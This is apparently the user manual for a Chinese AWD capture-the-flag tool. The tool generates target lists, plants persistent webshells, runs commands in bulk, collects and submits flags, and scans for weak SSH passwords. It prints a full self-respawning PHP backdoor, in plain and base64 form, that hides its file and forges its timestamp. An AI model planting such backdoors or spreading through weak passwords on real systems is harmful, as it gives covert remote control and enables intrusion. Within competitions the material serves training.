## 目标生成

>使用场景：在目标扫描前如果没有下发靶机地址列表，则需要自己生成一份去扫描


### ip段生成

>使用场景：裁判给了一个C段（192.168.10.0），所有队伍的靶机都在这个C段中，具体ip需要自己发现

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-1.png)

输入`192.168.10.*`(用*占位)即可在程序当前运行目录下生成一个`ip.txt`

```text
192.168.10.1:8080
192.168.10.2:8080
192.168.10.3:8080
192.168.10.4:8080
192.168.10.5:8080
...
...
192.168.10.251:8080
192.168.10.252:8080
192.168.10.253:8080
192.168.10.254:8080
192.168.10.255:8080
```

### 单ip多端口生成

>使用场景：某些小型比赛或训练赛，为了节约资源将所有靶机映射在同一台服务器的不同端口上

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-2.png)

然会会在程序运行目录下生成`ip.txt`

```text
192.168.100.103:10000
192.168.100.103:10001
192.168.100.103:10002
192.168.100.103:10003
...
...
192.168.100.103:10297
192.168.100.103:10298
192.168.100.103:10299
192.168.100.103:10300

```


### bugku专用

>使用场景：针对线上的域名生成 例如 192-168-1-X.pvp3553.bugku.cn

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-3.png)

按以下规则输入即可,`{}`中表示生成的范围，以`-`分割

```text
192-168-1-{1-255}.pvp3553.bugku.cn
192-168-{1-2}-{1-255}.pvp3553.bugku.cn
```

在当前目录下生成`ip.txt`

```text
192-168-1-1.pvp3553.bugku.cn
192-168-1-2.pvp3553.bugku.cn
192-168-1-3.pvp3553.bugku.cn
192-168-1-4.pvp3553.bugku.cn
...
...
192-168-1-252.pvp3553.bugku.cn
192-168-1-253.pvp3553.bugku.cn
192-168-1-254.pvp3553.bugku.cn
192-168-1-255.pvp3553.bugku.cn
```


## 目标扫描

>使用场景：自己生成靶机地址或通过平台下载后，进行特征扫描来识别题目

### web靶机扫描

先打开自己的web靶机，输入网页上可以看到的特征即可

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-4.png)


### pwn靶机扫描

pwn靶机也是同理，先连上自己的看看会输出什么就填什么

注意文件中的地址不能带上`http`，需要是`ip:port`格式

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-5.png)


## 写入不死马

>使用场景：发现题目的默认后门或者rce点后写入不死马

### 默认马

**在可以rce的参数后加`*`，多个参数用&连接**

可写路径：一般默认为空，当某些靶机的web根目录**不可写**时需要手动指定，例如指定写入到`/var/www/html/xxx/`（使用绝对路径）



Get传参后门：

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-6.png)

Post传参后门：

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-7.png)


同时会在当前目录下生成一个`shell.txt`来保存记录



### 自定义不死马

>使用场景：想写入自己自定义的不死马

当勾选这个功能后，可以自定义不死马的内容

例如一个不死马如下，密码是123456，访问的文件名是.666.php

```php
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.666.php';
    $code = '<?php if(md5($_GET["pass"])=="e10adc3949ba59abbe56e057f20f883e"){@eval($_POST["aa"]);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .666.php');
        usleep(1);
    }
?>
```

使用前需要base64编码一次（工具页中提供base64加解密功能）

```
PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLjY2Ni5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UiKXtAZXZhbCgkX1BPU1RbImFhIl0pO30gPz4nOwogICAgd2hpbGUgKDEpewogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgICAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDE4LTEyLTAxIDA5OjEwOjEyIiAuNjY2LnBocCcpOwogICAgICAgIHVzbGVlcCgxKTsKICAgIH0KPz4=
```


![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-8.png)


### 随机文件名

>使用场景：防止其他队伍监控流量进行蹭车

勾选后写入的shell的文件名，密码，连接参数随机产生

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-9.png)

会在当前目录下生成`random.txt`来保存shell记录


## 执行命令

>使用场景：通过不死马或者其他漏洞点进行命令执行


### 一般shell执行命令


![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-10.png)



### 通过随机马执行命令


![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-11.png)


### 获取flag

>使用场景：批量获取窗口中的flag

需要先通过执行`cat /flag`或`curl`获取到flag

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-12.png)

点击获取flag按钮后，程序会自动在返回的结果中搜索包含`flag{}`的值并保存到`flag.txt`中

如果flag格式并不是`flag{}`，则可以自定义匹配的正则表达式


## 提交flag

>使用场景：批量获取到flag后自动访问提交接口进行提交flag

**flag用*占位。多个参数用&分割。注意在设置页中设置线程数，太大容易丢包**

Get方式：`http://192.168.100.103:4444/api/flag?token=xxxx&flag=xxxx`

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-13.png)


Post方式：

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-14.png)



## ssh

>使用场景：ssh弱口令

比如裁判下发的ssh地址为`x.x.x.x:2222 密码：ctf@awd`，就可以知道所有队伍都是这个密码。而且有些比赛不设置防御时间，一开始就能连到其他队伍的ssh（这里就不得不提到某年的宁波市awd）

#### ssh扫描

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-15.png)

扫描结果会保存在`ssh.txt`

### ssh密码更改

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-16.png)


## 工具&设置

>使用场景：base64，url的编码与解码，行去重与清屏

支持拖放文件

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-17.png)

![](https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-18.png)



## 更新日志

V1.0：初始版本</br>
V1.1：多种扫描方式，代码逻辑优化</br>
V1.2：添加随机不死马功能，修复诺干bug</br>
V2.1：70%代码重构，速度较上一代提升11倍。添加ssh和设置模块</br>

可能将要做的：</br>
1：希望加入pwn的批量攻击（貌似没多少比赛中有）</br>
2：希望不止php的不死马（虽然大部分比赛php够用了）</br>